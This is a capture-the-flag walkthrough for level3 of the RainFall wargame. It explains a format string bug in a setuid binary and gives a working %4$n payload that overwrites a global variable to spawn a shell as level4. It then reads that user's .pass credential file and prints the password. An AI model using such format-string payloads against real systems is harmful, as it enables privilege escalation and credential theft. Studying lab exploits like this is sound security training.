# 🔑 Level3 Walkthrough

## Step 1: Discovering the binary
When logged in as `level3`, we see:

```bash
level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

- The binary runs with **level4’s privileges** (setuid).  
- Running it just echoes back input:

```bash
./level3
hello
hello
```

So it looks harmless at first.

---

## Step 2: Looking at the source
From `source.c`:

```c
int m = 0;

void p() {
    char buff[520];

    fgets(buff, 512, stdin);
    printf(buff);

    if (m == 64) {
        fwrite("Wait what?!\n", 12, 1, stdout);
        system("/bin/sh");
    }
}
```

Key points:
- Input is read safely with `fgets()` (so no buffer overflow).  
- But then `printf(buff)` is called **without a format string** → **format string vulnerability**.
- If global variable `m` equals 64, the program prints `"Wait what?!"` and spawns a shell.  

So our goal: **use the format string bug to set `m = 64`.**

---

## Step 3: Understanding format string vulnerabilities
- what does this **vulnerability** mean is unlike `printf("%s", buff)` which will write every line no mater what it is value => even a `%x` `%n` will just be a string wrting to the terminal the `printf(buuf)` will be intreputed hence `%x` will cause the printf to wirte a random value as hex

- Normally you’d call `printf("%s", buff)`.  
- Here, user input is directly passed as the format string.  
- That means format specifiers like `%x`, `%s`, `%n` are interpreted.  
- `%n` is special: it writes the number of characters printed so far into a given memory address.  

So if we can place the address of `m` on the stack, then use `%n`, we can write to it.

---

## Step 4: Finding the variable `m`
From disassembly, `m` is stored at:

```
0x0804988c
```

---

## Step 5: Locating our input on the stack
why we need this:
- we locate our input on the stack because printf reads arguments from the stack — and you must know which position your data occupies to control reads (%x, %s) or writes (%n). hence we want to know where buffer is stored.

- printf(buff) knows where the buffer is only as a string, not as data arguments.
When your input contains %x, %n, etc., printf starts looking for arguments on the stack, and your buffer is not automatically one of those arguments — that’s why you must find where it appears.

We can test with:

```bash
python -c 'print "AAAA %x %x %x %x %x %x %x %x"' | ./level3
```

Output shows `41414141` (our `AAAA`) at the **4th position**.  
So our input is the 4th argument to `printf`.

---

## Step 6: Crafting the exploit
We want to:
1. Put the address of `m` at the start of our input.  
2. Print 64 characters total.  
3. Use `%n` to write that count (64) into `m`.  

Payload structure:
- Address of `m` (little endian): `\x8c\x98\x04\x08`  
- Padding: 60 characters (so total printed = 64)  
- `%4$n` → write the number of characters printed so far into the 4th argument (our address).  

Exploit:

```bash
(python -c 'import sys; sys.stdout.write(b"\x8c\x98\x04\x08" + b"A"*60 + b"%4$n")'; cat -) | ./level3
```

So the address comes first because we want:

the first word of our controlled data to be interpreted as the pointer
---

## Step 7: Exploiting
Running the payload:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

We now have a shell as **level4**.

---

# ✅ Summary
- Vulnerability: **format string bug** in `printf(buff)`.  
- Goal: set global variable `m = 64`.  
- Address of `m`: `0x0804988c`.  
- Input position: 4th argument.  
- Exploit: `"\x8c\x98\x04\x08" + "A"*60 + "%4$n"`.  
- Result: spawns a shell as **level4**, password retrieved.  
